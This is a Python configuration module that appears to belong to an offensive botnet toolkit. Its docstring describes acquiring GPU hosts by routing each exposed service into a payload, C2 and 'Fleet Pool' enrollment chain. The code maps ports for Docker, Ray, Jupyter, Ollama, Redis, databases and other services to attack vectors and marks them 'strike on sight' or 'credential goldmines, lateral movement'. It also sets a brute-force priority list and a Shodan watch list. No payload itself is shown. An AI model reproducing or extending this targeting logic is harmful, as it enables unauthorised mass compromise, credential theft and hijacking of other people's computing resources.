"""
Full-spectrum service acquisition. Design principle: one hole = one GPU host.
Each port maps to a validator that fingerprints the service; anything confirmed
routes into the SAME enrollment chain (payload_src -> Jobs/API/container/kernel)
-> same C2 -> same Fleet Pool.

Port groups by expected value:
  A. PRIMARY RCE      — direct code execution, proven in the wild
  B. ML ORCHESTRATION — our original targets, plus cousins
  C. DATA/INFRA       — lateral infrastructure, token goldmines
  D. LLM RUNTIME      — open local-model servers; rising fast, almost always GPU hosts
"""

# --- A. PRIMARY RCE (highest yield, strike on sight) ---
SPECTRUM = {
    2375:  "docker",
    2376:  "docker",
    8265:  "ray",
    8266:  "ray",
    8888:  "jupyter",
    8889:  "jupyter",
    8890:  "jupyter",
    8188:  "comfyui",
    7860:  "comfyui",
    6006:  "tensorboard",
    1234:  "lmstudio",
    11434: "ollama",
    11435: "ollama",
    # --- B. ML ORCHESTRATION ---
    31380: "kubeflow",
    8080:  "mlflow_k8s",
    5000:  "mlflow",
    21002: "fastchat",
    8000:  "vllm",
    8081:  "triton",
    # --- C. DATA / INFRA (credential goldmines, lateral movement) ---
    9200:  "elasticsearch",
    8123:  "clickhouse",
    6379:  "redis",
    5432:  "postgres",
    3306:  "mysql",
    9000:  "minio",
    9001:  "minio_console",
    5678:  "n8n",
    3000:  "metabase",
    15672: "rabbitmq",
    8086:  "influxdb",
    9090:  "prometheus",
    # --- D. BIG DATA (GPU-adjacent clusters, root run) ---
    7077:  "spark",
    8082:  "spark_ui",
    8088:  "hadoop_yarn",
    9870:  "hdfs",
    4040:  "spark_app",
    # --- E. MISC RCE / OPS ---
    9999:  "websh_custom",
    7861:  "gradio",
}


# beacon-heavy compact scan list for brute phases (the ones we port-dial directly)
BRUTE_PRIORITY = [2375, 8265, 8888, 8188, 6006, 11434, 31380, 5000, 8080, 1234]

# metadata-only sources (Shodan/InternetDB) watch the FULL spectrum — filtering is free
IDB_SPECTRUM = sorted(SPECTRUM.keys())


def spectrum_for_port(port: int) -> str:
    """Return the service vector name for a given port, or 'unknown'."""
    return SPECTRUM.get(port, "unknown")


__all__ = ["SPECTRUM", "BRUTE_PRIORITY", "IDB_SPECTRUM", "spectrum_for_port"]
